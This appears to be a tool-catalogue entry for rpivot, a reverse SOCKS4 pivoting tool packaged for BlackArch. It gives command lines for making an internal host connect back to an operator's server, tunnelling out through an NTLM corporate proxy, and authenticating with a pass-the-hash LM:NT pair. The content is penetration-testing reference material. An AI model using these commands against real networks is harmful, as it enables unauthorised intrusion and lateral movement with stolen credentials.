---
name: "rpivot"
categories:
  - blackarch-proxy
version: "5.4963487"
homepage: "https://github.com/artkond/rpivot"
packaged-by: [blackarch]
blackarch-builddate: "2024-12-26"
build-system: scripts
license: custom:unknown
meta-checked: "2026-11-09"
github-repo: "artkond/rpivot"
github-stars: 674
github-pushed: "2018-07-12"
github-archived: false
github-issues: 6
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.9
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# rpivot

> Reverse SOCKS4 pivot: a host inside the network dials out, and the operator gets a SOCKS proxy into it.

## What it's for

rpivot is a client/server tool that tunnels traffic into an internal network via SOCKS4, working like ssh dynamic port forwarding in the opposite direction: the client runs on the machine you want to tunnel through (a host inside the restricted network), and the server runs on the operator's machine waiting for the client to dial out. Once connected, the server exposes a local SOCKS4 proxy that any tool can use through proxychains. It is Python 2.6–2.7 with no dependencies beyond the standard library, supports pivoting out through an NTLM-authenticated corporate proxy (including pass-the-hash), and a pre-built Windows client binary is available in the release section of the repository.

## Typical use cases

### Start the listener on the operator machine

Bring up the server that will expose the SOCKS4 proxy.

```
rpivot-server --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

Outcome: the server listens on port 9999; when a client connects, a SOCKS4 proxy becomes available on 127.0.0.1:1080 on this machine (upstream source trees run the same logic as `python server.py ...`).

### Connect back from the target

Run the client on the host whose network you want to reach.

```
rpivot-client --server-ip 198.51.100.10 --server-port 9999
```

Outcome: the client opens an outbound connection to the server and the server-side SOCKS4 proxy goes live. Add `socks4 127.0.0.1 1080` to proxychains.conf and run tools via `proxychains <tool>` to reach the target's internal network.

### Pivot out through an NTLM proxy

Use when the target can only reach the Internet via an authenticating web proxy.

```
rpivot-client --server-ip 198.51.100.10 --server-port 9999 --ntlm-proxy-ip 198.51.100.20 --ntlm-proxy-port 8080 --domain EXAMPLE.COM --username user --password Password1
```

Outcome: the client authenticates to the NTLM proxy with the given credentials, tunnels the rpivot connection through it, and the reverse SOCKS tunnel is established as usual.

### Pivot with pass-the-hash

Reuse an NTLM hash instead of a plaintext password.

```
rpivot-client --server-ip 198.51.100.10 --server-port 9999 --ntlm-proxy-ip 198.51.100.20 --ntlm-proxy-port 8080 --domain EXAMPLE.COM --username user --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

Outcome: the client authenticates to the NTLM proxy using the LM:NT hash pair — no password needed — and the server-side SOCKS4 proxy comes up.

*No corpus evidence — derived from upstream documentation.*
